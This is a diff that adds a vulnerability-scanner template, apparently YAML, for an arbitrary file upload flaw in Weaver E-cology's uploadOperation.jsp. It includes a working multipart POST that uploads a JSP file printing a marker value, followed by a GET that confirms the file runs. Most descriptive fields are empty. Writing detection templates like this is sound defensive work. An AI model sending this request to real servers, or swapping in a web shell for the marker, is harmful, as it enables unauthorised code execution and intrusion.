@@ -1,0 +1,33 @@
+id:
+
+info:
+  name: 泛微E-cology uploadOperation.jsp任意文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /page/exportImport/uploadOperation.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
+  data: |
+    ------WebKitFormBoundaryFy3iNVBftjP6IOwo+
+    Content-Disposition: form-data; name="file"; filename="12.jsp"
+    Content-Type: application/octet-stream
+    
+    <%out.print(1111);%>
+    ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
+response1:
+  headers:
+  body:
+  code:
+requests2:
+  method: GET
+  path: /page/exportImport/fileTransfer/12.jsp
+response2:
+  body: 1111
+
+
+
+
